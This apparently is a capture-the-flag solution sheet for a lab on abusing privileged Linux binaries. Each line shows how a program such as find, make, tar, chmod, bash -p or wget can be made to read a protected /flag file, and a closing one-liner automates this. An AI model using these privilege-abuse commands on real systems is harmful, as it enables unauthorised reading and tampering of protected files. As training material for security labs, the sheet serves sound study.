# 8 is emacs. do it manually
# 9 is nano. do it manually
# 10 is rev. rev it back
# 11 is od. od -c -w100 /flag | python -c 'print("".join(input().split()))' manually
# 14 is base32. base32 -d it back
# 15 is base64. base64 -d it back
# 16 is split. cat xaa for flag
# 17 is gzip. gzip -c /flag | gunzip
# 18 is bzip2. bzip2 /flag && bzip2 -d -c /flag.bz2
# 19 is zip. zip - /flag | jar -x && cat flag && rm flag
# 20 is tar. tar --group hacker --owner hacker -c /flag | tar -x && cat flag && rm -f flag
# 21 is ar. ar r /tmp/flag /flag && cat /tmp/flag
# 22 is cpio. echo /flag | cpio -o
# 23 is genisoimage. genisoimage -sort /flag
# 24 is env. env cat /flag
# 25 is find. find . -exec cat /flag \;
# 26 is make. make --eval='x:$(shell cat /flag)'
# 27 is nice. nice cat /flag
# 28 is timeout. timeout 1 cat /flag
# 29 is stdbuf. stdbuf -i0 cat /flag
# 30 is setarch. setarch x86_64 cat /flag
# 31 is watch. watch -x cat /flag
# 32 is socat. socat file:/flag stdout
# 33 is whiptail. whiptail --textbox /flag 10 100
# 34 is awk. awk '{print}' /flag
# 35 is sed. sed 's/f/f/' /flag
# 36 is ed. ed /flag. then enter ,p
# 37 is chown. chown hacker /flag; cat /flag
# 38 is chmod. chmod +r /flag; cat /flag
# 39 is cp. cp /flag /dev/stdout
# 40 is mv. mv /usr/bin/cat /usr/bin/mv && /challenge/baby* && mv /flag
# 41 is perl. perl -ne print /flag 2>/dev/null
# 42 is python. python -c 'print(open("/flag").read())'
# 43 is ruby. echo 'puts File.read("/flag")' > /tmp/script.rb && ruby /tmp/script.rb
# 44 is bash. bash -p -c 'cat /flag'
# 45 is data. date -f /flag
# 46 is dmesg. dmesg -F /flag
# 47 is wc. wc --files0-from /flag
# 48 is gcc. gcc -x c -E /flag
# 49 is as. as /flag
# 50 is wget. nc -lvvnp 1234 & wget 127.0.0.1:1234 --method=POST --body-file=/flag
# 

/challenge/baby* | grep 'I just' | sed 's/.*on \(.*\)\./\1/' | xargs -I {} bash -c '{} /flag'